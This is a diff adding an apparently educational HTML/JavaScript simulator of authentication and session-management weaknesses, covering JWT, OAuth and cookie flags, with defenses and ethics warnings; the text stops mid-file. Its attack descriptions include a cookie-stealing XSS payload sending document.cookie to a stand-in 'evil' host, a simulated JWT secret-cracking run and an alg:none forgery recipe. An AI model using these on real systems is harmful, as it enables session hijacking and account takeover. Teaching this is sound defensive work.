@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Authentication &amp; Session Management — JWT, OAuth, Cookie Security Simulator</title>
+<style>
+  :root{
+    --bg-a:#0a0e1a; --bg-b:#05070d; --panel:#070a14; --border:#1e293b;
+    --green:#22c55e; --green-lt:#4ade80; --cyan:#22d3ee; --amber:#f59e0b;
+    --red:#ef4444; --purple:#a855f7; --blue:#3b82f6;
+    --text:#cbd5e1; --muted:#64748b;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;overflow:hidden}
+  body{
+    font-family:'Courier New',ui-monospace,Menlo,monospace;
+    background:linear-gradient(160deg,var(--bg-a),var(--bg-b));
+    color:var(--text); display:flex; flex-direction:column;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:9999;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.15) 0 1px,transparent 1px 3px);
+    opacity:.35;
+  }
+  header{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:8px 16px; border-bottom:1px solid var(--border);
+    background:rgba(7,10,20,.85); z-index:10;
+  }
+  header h1{ font-size:15px; letter-spacing:2px; color:var(--cyan);
+    text-shadow:0 0 8px rgba(34,211,238,.5); }
+  header .sub{ font-size:10px; color:var(--muted); letter-spacing:1px; }
+  .header-actions{ display:flex; gap:8px; }
+  .header-actions button{
+    font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:5px 10px; border-radius:4px; cursor:pointer; transition:.15s;
+  }
+  .header-actions button:hover{ border-color:var(--cyan); color:var(--cyan); }
+  .header-actions button.active{
+    border-color:var(--cyan); color:var(--cyan);
+    box-shadow:0 0 10px rgba(34,211,238,.3);
+  }
+  .layout{ flex:1; display:flex; min-height:0; gap:1px; background:var(--border); }
+  .controls-pane{
+    width:340px; min-width:340px; background:var(--panel);
+    display:flex; flex-direction:column; overflow-y:auto; padding:10px; gap:10px;
+  }
+  .canvas-pane{ flex:1; position:relative; background:var(--panel); min-width:0; }
+  #stage{ display:block; width:100%; height:100%; }
+  .teaching-pane{
+    width:400px; min-width:400px; background:var(--panel);
+    display:flex; flex-direction:column; overflow:hidden;
+  }
+  .ctl-group{
+    border:1px solid var(--border); border-radius:5px;
+    background:#060912; padding:8px;
+  }
+  .ctl-group h3{
+    font-size:10px; letter-spacing:1.5px; color:var(--cyan);
+    margin-bottom:7px; text-transform:uppercase;
+  }
+  label.ctl-label{
+    display:block; font-size:10px; color:var(--muted); margin:6px 0 3px;
+  }
+  select,input[type=text],textarea{
+    width:100%; font-family:inherit; font-size:11px;
+    background:#0a0f1a; border:1px solid var(--border); color:var(--green-lt);
+    padding:5px 7px; border-radius:3px; outline:none;
+  }
+  select:focus,input:focus,textarea:focus{ border-color:var(--cyan); }
+  textarea{ resize:vertical; min-height:52px; line-height:1.4; font-family:'Courier New',monospace; font-size:10px; }
+  input[type=range]{
+    width:100%; -webkit-appearance:none; height:4px; background:#1e293b;
+    border-radius:2px; outline:none; margin:2px 0;
+  }
+  input[type=range]::-webkit-slider-thumb{
+    -webkit-appearance:none; width:13px; height:13px; border-radius:50%;
+    background:var(--cyan); cursor:pointer; box-shadow:0 0 7px rgba(34,211,238,.7);
+  }
+  input[type=range]::-moz-range-thumb{
+    width:13px; height:13px; border:none; border-radius:50%;
+    background:var(--cyan); cursor:pointer;
+  }
+  .slider-row{ display:flex; justify-content:space-between; font-size:10px; color:var(--muted); }
+  .slider-val{ color:var(--cyan); font-weight:bold; }
+  .btn-row{ display:flex; gap:6px; flex-wrap:wrap; margin-top:6px; }
+  button.act{
+    flex:1; min-width:70px; font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:7px 6px; border-radius:4px; cursor:pointer; transition:.15s;
+    text-transform:uppercase;
+  }
+  button.act:hover{ border-color:var(--cyan); color:var(--cyan); }
+  button.act.primary{
+    background:linear-gradient(180deg,#0f2a2a,#0a1a1a);
+    border-color:var(--cyan); color:var(--cyan);
+    box-shadow:0 0 10px rgba(34,211,238,.25);
+  }
+  button.act.primary:hover{ box-shadow:0 0 16px rgba(34,211,238,.5); }
+  button.act.danger{ border-color:var(--red); color:#fca5a5; }
+  button.act.warn{ border-color:var(--amber); color:#fcd34d; }
+  button.act.ok{ border-color:var(--green); color:var(--green-lt); }
+  button.act.ok:hover{ background:#0f2a18; }
+  button.act.pulse{ animation:pulseCyan 1.4s infinite; }
+  @keyframes pulseCyan{
+    0%,100%{ box-shadow:0 0 6px rgba(34,211,238,.3); }
+    50%{ box-shadow:0 0 18px rgba(34,211,238,.8); }
+  }
+  .term{
+    background:#0a0f0a; border:1px solid #14321a; border-radius:4px;
+    padding:7px; font-size:10px; line-height:1.45; color:var(--green-lt);
+    height:150px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+  }
+  .term::-webkit-scrollbar,.teaching-feed::-webkit-scrollbar,
+  .controls-pane::-webkit-scrollbar{ width:6px; }
+  .term::-webkit-scrollbar-thumb,.teaching-feed::-webkit-scrollbar-thumb,
+  .controls-pane::-webkit-scrollbar-thumb{ background:#1e293b; border-radius:3px; }
+  .term .prompt{ color:var(--green); }
+  .term .cursor{ display:inline-block; width:7px; height:12px; background:var(--green-lt);
+    animation:blink 1s step-end infinite; vertical-align:middle; }
+  @keyframes blink{ 50%{ opacity:0; } }
+  .metrics-grid{
+    display:grid; grid-template-columns:repeat(4,1fr); gap:5px;
+    padding:8px; border-bottom:1px solid var(--border);
+  }
+  .metric{
+    background:#060912; border:1px solid var(--border); border-radius:4px;
+    padding:5px 6px; text-align:center;
+  }
+  .metric .m-label{ font-size:8px; color:var(--muted); letter-spacing:.5px;
+    text-transform:uppercase; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .metric .m-value{ font-size:14px; font-weight:bold; color:var(--green-lt);
+    margin-top:2px; transition:color .2s; }
+  .metric.warn .m-value{ color:var(--amber); }
+  .metric.bad .m-value{ color:var(--red); }
+  .metric.cyan .m-value{ color:var(--cyan); }
+  .info-card{
+    padding:8px; border-bottom:1px solid var(--border); font-size:10px;
+    line-height:1.5; color:var(--muted);
+  }
+  .info-card b{ color:var(--cyan); }
+  .info-card .eq{ color:var(--green-lt); font-size:10px;
+    background:#060912; padding:3px 5px; border-radius:3px;
+    display:inline-block; margin:2px 0; }
+  .teaching-feed{
+    flex:1; overflow-y:auto; padding:6px 8px; display:flex;
+    flex-direction:column; gap:4px;
+  }
+  .feed-item{
+    font-size:10px; line-height:1.45; padding:5px 7px; border-radius:3px;
+    background:#060912; border-left:3px solid var(--blue);
+    animation:feedIn .25s ease-out; word-break:break-word;
+  }
+  @keyframes feedIn{ from{ opacity:0; transform:translateX(10px); } to{ opacity:1; transform:none; } }
+  .feed-item .tag{
+    font-size:8px; font-weight:bold; letter-spacing:1px;
+    padding:1px 5px; border-radius:2px; margin-right:5px; display:inline-block;
+  }
+  .feed-item.info{ border-left-color:var(--blue); }
+  .feed-item.info .tag{ background:rgba(59,130,246,.2); color:#93c5fd; }
+  .feed-item.ok{ border-left-color:var(--green); }
+  .feed-item.ok .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .feed-item.warn{ border-left-color:var(--amber); }
+  .feed-item.warn .tag{ background:rgba(245,158,11,.2); color:#fcd34d; }
+  .feed-item.error{ border-left-color:var(--red); }
+  .feed-item.error .tag{ background:rgba(239,68,68,.2); color:#fca5a5; }
+  .feed-item.concept{ border-left-color:var(--purple); }
+  .feed-item.concept .tag{ background:rgba(168,85,247,.2); color:#d8b4fe; }
+  .feed-item.ethics{ border-left-color:#fbbf24; background:#1a1506; }
+  .feed-item.ethics .tag{ background:rgba(251,191,36,.25); color:#fde68a; }
+  .feed-item.cmd{
+    border-left-color:var(--green); background:#0a0f0a; color:var(--green-lt);
+    font-family:'Courier New',monospace; white-space:pre-wrap;
+  }
+  .feed-item.cmd .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .ethics-banner{
+    position:absolute; top:8px; left:50%; transform:translateX(-50%);
+    background:rgba(120,53,15,.85); border:1px solid var(--amber);
+    color:#fde68a; font-size:9px; padding:4px 12px; border-radius:4px;
+    letter-spacing:.5px; z-index:5; white-space:nowrap;
+    box-shadow:0 0 14px rgba(245,158,11,.3);
+  }
+  .footer-overlay{
+    position:absolute; bottom:6px; left:50%; transform:translateX(-50%);
+    font-size:8px; color:var(--muted); letter-spacing:.5px; z-index:5; white-space:nowrap;
+  }
+  .status-badges{
+    position:absolute; top:38px; left:10px; z-index:5;
+    display:flex; flex-direction:column; gap:4px;
+  }
+  .status-badge{
+    font-size:9px; background:rgba(7,10,20,.85); border:1px solid var(--border);
+    padding:3px 8px; border-radius:3px; color:var(--muted); letter-spacing:.5px;
+  }
+  .status-badge b{ color:var(--cyan); }
+  .status-badge.warn b{ color:var(--amber); }
+  .status-badge.bad b{ color:var(--red); }
+  .auth-chain{
+    position:absolute; bottom:26px; left:10px; right:10px; z-index:5;
+    display:flex; gap:3px;
+  }
+  .auth-phase{
+    flex:1; text-align:center; font-size:8px; letter-spacing:.5px;
+    padding:4px 2px; background:rgba(7,10,20,.8); border:1px solid var(--border);
+    border-radius:3px; color:var(--muted); transition:.2s;
+  }
+  .auth-phase.done{ border-color:var(--cyan); color:var(--cyan);
+    background:rgba(34,211,238,.12); }
+  .auth-phase.active{ border-color:var(--cyan); color:var(--cyan);
+    background:rgba(34,211,238,.2); box-shadow:0 0 10px rgba(34,211,238,.6);
+    animation:kcCyan 1.2s infinite; }
+  @keyframes kcCyan{ 50%{ box-shadow:0 0 16px rgba(34,211,238,.9); } }
+  .toast{
+    position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(60px);
+    background:#0b1220; border:1px solid var(--green); color:var(--green-lt);
+    padding:8px 18px; border-radius:4px; font-size:11px; letter-spacing:1px;
+    opacity:0; transition:.3s; z-index:10000; pointer-events:none;
+    box-shadow:0 0 20px rgba(34,197,94,.3);
+  }
+  .toast.show{ transform:translateX(-50%) translateY(0); opacity:1; }
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <h1>AUTHENTICATION &amp; SESSIONS</h1>
+    <span class="sub">JWT · OAUTH2 · OIDC · COOKIES · OWASP A07 · NIST SP 800-63B</span>
+  </div>
+  <div class="header-actions">
+    <button class="teaching-toggle active" id="teachingToggle">📖 TEACHING: ON</button>
+    <button class="voice-toggle" id="voiceToggle">VOICE: OFF</button>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="controls-pane">
+    <div class="ctl-group">
+      <h3>◆ Auth Mechanism</h3>
+      <select id="authSelect">
+        <option value="session">Server-side session (cookie ID)</option>
+        <option value="jwt-hs">JWT signed with HS256 (shared secret)</option>
+        <option value="jwt-rs">JWT signed with RS256 (asymmetric)</option>
+        <option value="oauth">OAuth2 Authorization Code + PKCE</option>
+        <option value="oidc">OpenID Connect (OIDC)</option>
+        <option value="saml">SAML 2.0</option>
+        <option value="webauthn">WebAuthn / FIDO2</option>
+        <option value="basic">HTTP Basic Auth (legacy)</option>
+      </select>
+      <label class="ctl-label">Weakness</label>
+      <select id="weakSelect">
+        <option value="jwt-alg">JWT alg:none / algorithm confusion</option>
+        <option value="jwt-weak">JWT weak HMAC secret</option>
+        <option value="fixation">Session fixation</option>
+        <option value="predictable">Predictable session IDs</option>
+        <option value="nologout">No server-side logout</option>
+        <option value="noexpiry">No token expiry</option>
+        <option value="xss">Token stealable via XSS</option>
+        <option value="csrf">Session usable cross-site (no SameSite)</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Session Details</h3>
+      <label class="ctl-label">Session ID / JWT</label>
+      <textarea id="tokenInput">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.abc123sig</textarea>
+      <label class="ctl-label">Cookie flags</label>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-top:4px">
+        <button type="button" class="act ok" id="secureBtn" style="font-size:9px">SECURE ✓</button>
+        <button type="button" class="act ok" id="httpOnlyBtn" style="font-size:9px">HTTPONLY ✓</button>
+        <button type="button" class="act" id="sameSiteBtn" style="font-size:9px">SAMESITE</button>
+        <button type="button" class="act" id="domainBtn" style="font-size:9px">DOMAIN</button>
+      </div>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Parameters</h3>
+      <label class="ctl-label">Session TTL (min) <span class="slider-val" id="ttlVal">60</span></label>
+      <input type="range" id="ttlSlider" min="1" max="1440" value="60">
+      <label class="ctl-label">Entropy (bits) <span class="slider-val" id="entVal">128</span></label>
+      <input type="range" id="entSlider" min="32" max="512" value="128">
+      <label class="ctl-label">Rotation interval (min) <span class="slider-val" id="rotVal">15</span></label>
+      <input type="range" id="rotSlider" min="0" max="60" value="15">
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Actions</h3>
+      <div class="btn-row">
+        <button type="button" class="act primary pulse" id="startBtn">▶ TEST</button>
+        <button type="button" class="act" id="stepBtn">⏭ STEP</button>
+        <button type="button" class="act danger" id="resetBtn">⟲ RESET</button>
+      </div>
+      <div class="btn-row">
+        <button type="button" class="act warn" id="stealBtn">🕵 STEAL SESSION</button>
+        <button type="button" class="act ok" id="hardenBtn">🛡 HARDEN</button>
+      </div>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Terminal</h3>
+      <div class="term" id="terminal">
+        <span class="prompt">pentester@auth:~$ </span><span id="termContent"></span><span class="cursor"></span>
+      </div>
+    </div>
+  </aside>
+
+  <main class="canvas-pane">
+    <canvas id="stage"></canvas>
+    <div class="ethics-banner">⚠ FOR EDUCATIONAL USE ONLY — Session hijacking and credential theft are federal crimes.</div>
+    <div class="status-badges">
+      <div class="status-badge">AUTH: <b id="badgeAuth">JWT-HS</b></div>
+      <div class="status-badge">WEAKNESS: <b id="badgeWeak">JWT-ALG</b></div>
+      <div class="status-badge">STATUS: <b id="badgeStatus">IDLE</b></div>
+      <div class="status-badge">VERDICT: <b id="badgeVerdict">—</b></div>
+    </div>
+    <div class="auth-chain" id="authChain">
+      <div class="auth-phase" id="ap-LOGIN">LOGIN</div>
+      <div class="auth-phase" id="ap-ISSUE">ISSUE TOKEN</div>
+      <div class="auth-phase" id="ap-STORE">STORE</div>
+      <div class="auth-phase" id="ap-VALIDATE">VALIDATE</div>
+      <div class="auth-phase" id="ap-ROTATE">ROTATE</div>
+      <div class="auth-phase" id="ap-LOGOUT">LOGOUT</div>
+    </div>
+    <div class="footer-overlay">OWASP A07:2021 · NIST SP 800-63B (AAL) · RFC 6749 (OAuth2) · RFC 7519 (JWT) · FIDO2</div>
+  </main>
+
+  <aside class="teaching-pane">
+    <div class="metrics-grid">
+      <div class="metric cyan" id="mEntropy"><div class="m-label">Entropy (bits)</div><div class="m-value" id="mEntropyVal">128</div></div>
+      <div class="metric" id="mTTL"><div class="m-label">TTL</div><div class="m-value" id="mTTLVal">60m</div></div>
+      <div class="metric" id="mCrack"><div class="m-label">Crack Time</div><div class="m-value" id="mCrackVal">10^10 yr</div></div>
+      <div class="metric" id="mFixation"><div class="m-label">Fixation</div><div class="m-value" id="mFixationVal">SAFE</div></div>
+      <div class="metric" id="mXSS"><div class="m-label">XSS Steal</div><div class="m-value" id="mXSSVal">NO</div></div>
+      <div class="metric" id="mCSRF"><div class="m-label">CSRF</div><div class="m-value" id="mCSRFVal">SAFE</div></div>
+      <div class="metric" id="mFlags"><div class="m-label">Cookie Flags</div><div class="m-value" id="mFlagsVal">0/4</div></div>
+      <div class="metric" id="mDefense"><div class="m-label">Posture</div><div class="m-value" id="mDefenseVal">WEAK</div></div>
+    </div>
+    <div class="info-card">
+      <b>Auth is hard — sessions must survive adversaries.</b><br>
+      <span class="eq">Session ID entropy ≥ 128 bits (NIST SP 800-63B)</span><br>
+      <span class="eq">Cookies: Secure + HttpOnly + SameSite=Lax/Strict</span><br>
+      <span class="eq">JWT: verify signature, algorithm, expiry, audience</span><br>
+      <span class="eq">Rotate on privilege change; invalidate server-side</span><br>
+      <span style="color:var(--purple)">NIST SP 800-63B · OWASP A07 · RFC 6749/7519 · FIDO2</span>
+    </div>
+    <div class="teaching-feed" id="teachingFeed"></div>
+  </aside>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+var STATE = {
+  running:false,
+  auth:'jwt-hs',
+  weak:'jwt-alg',
+  token:'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.abc123sig',
+  secure:true,
+  httpOnly:true,
+  sameSite:false,
+  domain:false,
+  ttl:60,
+  entropy:128,
+  rotation:15,
+  fixation:'SAFE',
+  xss:'NO',
+  csrf:'SAFE',
+  flags:2,
+  posture:'WEAK',
+  phaseIdx:0,
+  tick:0,
+  lastTime:0,
+  events:[],
+  nodes:[],
+  feedCount:0
+};
+
+var PHASES = ['LOGIN','ISSUE','STORE','VALIDATE','ROTATE','LOGOUT'];
+
+var ATTACKS = {
+  'jwt-alg':{
+    title:'JWT algorithm confusion',
+    detail:'Change alg header to "none" and remove signature. Server that does not enforce expected algorithm accepts it. Or: change HS256 to RS256 and sign with the public key as HMAC secret.',
+    defense:'Server MUST enforce expected algorithm. Never trust the "alg" header from client. Reject "none".'
+  },
+  'jwt-weak':{
+    title:'Weak HMAC secret',
+    detail:'JWT signed with HS256 uses a secret. If the secret is weak (dictionary word, short, reused), attacker can brute-force offline with hashcat (mode 16500). 10^9 guesses/sec on GPU.',
+    defense:'Use ≥ 256-bit random secret from KMS/HSM. Rotate periodically. Consider RS256/ES256 instead.'
+  },
+  'fixation':{
+    title:'Session fixation',
+    detail:'Attacker sets victim session ID before login. After authentication, server does not rotate ID. Attacker uses known ID → hijack.',
+    defense:'Rotate session ID on ANY privilege change (login, elevation). Never accept client-supplied IDs.'
+  },
+  'predictable':{
+    title:'Predictable session IDs',
+    detail:'Sequential, timestamp-based, or low-entropy IDs. Attacker can enumerate valid sessions. Probability of guessing = 1 / 2^entropy.',
+    defense:'Use CSPRNG (crypto.randomBytes). Minimum 128 bits entropy. Test with statistical analysis.'
+  },
+  'nologout':{
+    title:'No server-side logout',
+    detail:'Logout deletes cookie but session remains valid on server. Attacker who stole the token keeps using it. Logout only clears client-side state.',
+    defense:'Server-side session invalidation on logout. Maintain denylist of revoked tokens (for JWTs — usually via short TTL + refresh).'
+  },
+  'noexpiry':{
+    title:'No token expiry',
+    detail:'Session cookie/token valid forever. Stolen session never expires. Revocation requires server-side denylist.',
+    defense:'Set expiry — short for access tokens (5-15min), longer for refresh tokens. Enforce server-side.'
+  },
+  'xss':{
+    title:'Token stealable via XSS',
+    detail:'Session cookie without HttpOnly is readable by JavaScript. XSS payload: fetch("//evil/?c="+document.cookie). Attacker receives session and impersonates user.',
+    defense:'Set HttpOnly flag → cookie invisible to JS. Add CSP. Sanitize output.'
+  },
+  'csrf':{
+    title:'Session usable cross-site',
+    detail:'No SameSite flag → browser sends cookie on cross-site requests. Attack page auto-submits form → action executes as user. No code execution needed.',
+    defense:'SameSite=Lax (default modern) or Strict. CSRF token for extra safety.'
+  }
+};
+
+var canvas = document.getElementById('stage');
+var ctx = canvas.getContext('2d');
+var terminalContent = document.getElementById('termContent');
+var teachingFeed = document.getElementById('teachingFeed');
+
+function resizeCanvas(){
+  var pane = canvas.parentElement;
+  canvas.width = pane.clientWidth;
+  canvas.height = pane.clientHeight;
+  buildTopology();
+}
+window.addEventListener('resize', resizeCanvas);
+
+function buildTopology(){
+  var W = canvas.width, H = canvas.height;
+  STATE.nodes = [
+    {id:'user', label:'user', ip:'browser', x:0.10*W, y:0.40*H, icon:'laptop', color:'#3b82f6', glow:0, blink:0},
+    {id:'attacker', label:'attacker', ip:'XSS/MITM', x:0.10*W, y:0.70*H, icon:'attacker', color:'#ef4444', glow:0, blink:0},
+    {id:'auth', label:'auth server', ip:'login.example-corp', x:0.35*W, y:0.40*H, icon:'server', color:'#22d3ee', glow:0, blink:0},
+    {id:'store', label:'session store', ip:'redis/memcached', x:0.55*W, y:0.25*H, icon:'database', color:'#a855f7', glow:0, blink:0},
+    {id:'api', label:'API', ip:'api.example-corp', x:0.75*W, y:0.40*H, icon:'server', color:'#22c55e', glow:0, blink:0},
+    {id:'siem', label:'SIEM', ip:'audit log', x:0.85*W, y:0.70*H, icon:'server', color:'#fcd34d', glow:0, blink:0}
+  ];
+}
+
+function drawIcon(type, x, y, color, glow, blink, label, ip){
+  ctx.save();
+  ctx.translate(x, y);
+  if(glow > 0){
+    var g = ctx.createRadialGradient(0,0,2,0,0,42);
+    g.addColorStop(0, 'rgba(34,211,238,'+(glow*0.55)+')');
+    g.addColorStop(1, 'rgba(0,0,0,0)');
+    ctx.fillStyle = g;
+    ctx.beginPath(); ctx.arc(0,0,42,0,Math.PI*2); ctx.fill();
+  }
+  ctx.strokeStyle = color; ctx.fillStyle = color;
+  ctx.lineWidth = 1.4;
+  ctx.shadowColor = color; ctx.shadowBlur = glow > 0 ? 8 : 0;
+
+  switch(type){
+    case 'server': {
+      ctx.strokeRect(-11,-16,22,32);
+      for(var i=0;i<5;i++){
+        var yy = -14 + i*6;
+        ctx.strokeRect(-9,yy,18,4.5);
+        ctx.fillStyle = blink%2===0 ? '#22c55e' : '#166534';
+        ctx.beginPath(); ctx.arc(7,yy+2.2,1.3,0,Math.PI*2); ctx.fill();
+        ctx.fillStyle = color;
+      }
+      break;
+    }
+    case 'laptop': {
+      ctx.strokeRect(-14,-12,28,18);
+      ctx.fillStyle = 'rgba(59,130,246,.15)';
+      ctx.fillRect(-13,-11,26,16);
+      ctx.strokeStyle = '#93c5fd'; ctx.lineWidth = 0.7;
+      for(var j=0;j<3;j++){ ctx.beginPath(); ctx.moveTo(-10,-8+j*4); ctx.lineTo(8,-8+j*4); ctx.stroke(); }
+      ctx.strokeStyle = color; ctx.lineWidth = 1.4;
+      ctx.beginPath(); ctx.moveTo(-16,6); ctx.lineTo(16,6); ctx.lineTo(14,9); ctx.lineTo(-14,9); ctx.closePath(); ctx.stroke();
+      break;
+    }
+    case 'database': {
+      var rx = 13, ry = 5, h = 22;
+      ctx.beginPath(); ctx.ellipse(0,-h/2,rx,ry,0,0,Math.PI*2); ctx.stroke();
+      ctx.beginPath(); ctx.moveTo(-rx,-h/2); ctx.lineTo(-rx,h/2); ctx.stroke();
+      ctx.beginPath(); ctx.moveTo(rx,-h/2); ctx.lineTo(rx,h/2); ctx.stroke();
+      ctx.beginPath(); ctx.ellipse(0,h/2,rx,ry,0,0,Math.PI*2); ctx.stroke();
+      ctx.beginPath(); ctx.ellipse(0,0,rx,ry,0,0,Math.PI*2); ctx.stroke();
+      break;
+    }
+    case 'attacker': {
+      ctx.beginPath();
+      ctx.arc(0,-6,7,Math.PI,0);
+      ctx.lineTo(8,8); ctx.lineTo(-8,8); ctx.closePath();
+      ctx.fillStyle = 'rgba(239,68,68,.3)'; ctx.fill(); ctx.stroke();
+      ctx.fillStyle = '#ef4444';
+      ctx.beginPath(); ctx.arc(-2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      ctx.beginPath(); ctx.arc(2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      break;
+    }
+  }
+  ctx.restore();
+  ctx.save();
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.textAlign = 'center';
+  ctx.fillStyle = color;
+  ctx.fillText(label, x, y + 30);
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = '#64748b';
+  ctx.fillText(ip, x, y + 40);
+  ctx.restore();
+}
+
+function spawnPacket(fromId, toId, color, label, speed){
+  var from = STATE.nodes.find(function(n){return n.id===fromId;});
+  var to = STATE.nodes.find(function(n){return n.id===toId;});
+  if(!from || !to) return;
+  STATE.events.push({type:'packet', from:{x:from.x,y:from.y}, to:{x:to.x,y:to.y},
+    t:0, speed:speed||0.02, color:color, label:label, size:4});
+}
+
+function escapeHtml(s){
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;');
+}
+
+function addFeed(tag, text, type){
+  type = type || 'info';
+  var div = document.createElement('div');
+  div.className = 'feed-item ' + type;
+  var time = new Date().toLocaleTimeString('en-US',{hour12:false});
+  div.innerHTML = '<span class="tag">' + escapeHtml(tag) + '</span> ' +
+    '<span style="color:#475569">[' + time + ']</span> ' + escapeHtml(text);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  STATE.feedCount++;
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+  speak(text);
+}
+function addCommandFeed(cmd, output){
+  var div = document.createElement('div');
+  div.className = 'feed-item cmd';
+  div.innerHTML = '<span class="tag">CMD</span><br>' +
+    '<span style="color:#4ade80">pentester@auth:~$ </span>' +
+    escapeHtml(cmd) + '\n' + escapeHtml(output);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+}
+
+var termQueue = []; var termTyping = false;
+function termWrite(text, callback){
+  termQueue.push({text:text, callback:callback});
+  if(!termTyping) processTermQueue();
+}
+function processTermQueue(){
+  if(termQueue.length === 0){ termTyping = false; return; }
+  termTyping = true;
+  var item = termQueue.shift();
+  var i = 0; var text = item.text;
+  terminalContent.textContent = '';
+  var interval = setInterval(function(){
+    if(i < text.length){ terminalContent.textContent += text[i]; i++; }
+    else { clearInterval(interval); termTyping = false; if(item.callback) item.callback(); setTimeout(processTermQueue, 100); }
+  }, 10);
+}
+
+var VOICE = { enabled:false, queue:[], lastSpoken:{}, speaking:false, synth:window.speechSynthesis };
+function speak(text){
+  if(!VOICE.enabled || !VOICE.synth) return;
+  var now = Date.now();
+  if(VOICE.lastSpoken[text] && now - VOICE.lastSpoken[text] < 4000) return;
+  VOICE.lastSpoken[text] = now;
+  if(VOICE.queue.length >= 4) VOICE.queue.shift();
+  VOICE.queue.push(text);
+  if(!VOICE.speaking) processVoiceQueue();
+}
+function processVoiceQueue(){
+  if(VOICE.queue.length === 0){ VOICE.speaking = false; return; }
+  VOICE.speaking = true;
+  var text = VOICE.queue.shift();
+  var utter = new SpeechSynthesisUtterance(text);
+  utter.rate = 1.05; utter.pitch = 1.0;
+  var voices = VOICE.synth.getVoices();
+  var pref = voices.find(function(v){return v.lang && v.lang.startsWith('en-US');}) || voices[0];
+  if(pref) utter.voice = pref;
+  utter.onend = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  utter.onerror = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  VOICE.synth.speak(utter);
+}
+
+function boot(){
+  resizeCanvas();
+  addFeed('ETHICS',
+    'Authentication is the gatekeeper of every user account. Ethical rules: (1) Never test authentication against systems you do not own — credential attacks violate CFAA/CMA. (2) Never reuse credentials found in one breach on other systems. (3) In bug bounties, demonstrate impact with your own test account. (4) Do not brute-force production systems — this causes outages and violates ToS. (5) Session hijacking causes real user harm — report to the affected service. (6) Handle PII from leaked credentials per GDPR — you may have legal obligations just from possessing the data.',
+    'ethics');
+  setTimeout(function(){
+    addFeed('CONCEPT',
+      'Authentication proves who you are; session management keeps you authenticated. Modern approaches: SERVER-SIDE SESSIONS store state on server, client holds only an opaque session ID cookie. JWTs encode state in the token — signed with HS256 (shared secret) or RS256/ES256 (asymmetric). OAuth2 delegates auth to an identity provider (Google, Okta, Auth0). OIDC adds identity layer on OAuth2. WebAuthn/FIDO2 uses public-key crypto with hardware authenticators (YubiKey, Touch ID) — phishing-resistant. NIST SP 800-63B defines AAL1-3: AAL1 single-factor, AAL2 MFA, AAL3 hardware + cryptographic. Session security = high entropy + short TTL + rotation + HttpOnly/Secure/SameSite cookies + server-side revocation.',
+      'concept');
+  }, 800);
+  setTimeout(function(){
+    termWrite('jwt-crack --token "eyJhbGciOiJIUzI1NiIs..." --wordlist rockyou.txt\n' +
+      '[*] JWT: HS256, kid: default\n' +
+      '[*] Secret hash: HMAC-SHA256\n' +
+      '[*] Testing 14M candidates...\n' +
+      '[!] CRACKED: secret = "secret123"');
+  }, 1600);
+  setTimeout(function(){
+    addFeed('INFO',
+      'Auth: ' + STATE.auth.toUpperCase() + '. Weakness: ' + ATTACKS[STATE.weak].title + '. Click TEST to evaluate.',
+      'info');
+    updateBadges();
+  }, 2400);
+  requestAnimationFrame(loop);
+}
+
+function loop(ts){
+  var dt = STATE.lastTime ? (ts - STATE.lastTime) : 16;
+  STATE.lastTime = ts;
+  STATE.tick++;
+  STATE.nodes.forEach(function(n){ n.blink = Math.floor(STATE.tick / 20); });
+
+  for(var i = STATE.events.length - 1; i >= 0; i--){
+    var e = STATE.events[i];
+    if(e.type === 'packet'){
+      e.t += e.speed * (dt/16);
+      if(e.t >= 1) STATE.events.splice(i,1);
+    }
+  }
+  STATE.nodes.forEach(function(n){ if(n.glow > 0) n.glow -= 0.008 * (dt/16); if(n.glow < 0) n.glow = 0; });
+
+  render();
+  updateBadges();
+  requestAnimationFrame(loop);
+}
+
+function render(){
+  var W = canvas.width, H = canvas.height;
+  ctx.clearRect(0,0,W,H);
+  var bg = ctx.createRadialGradient(W*0.5,H*0.4,50,W*0.5,H*0.4,W*0.7);
+  bg.addColorStop(0,'#0a0e1a'); bg.addColorStop(1,'#05070d');
+  ctx.fillStyle = bg; ctx.fillRect(0,0,W,H);
+
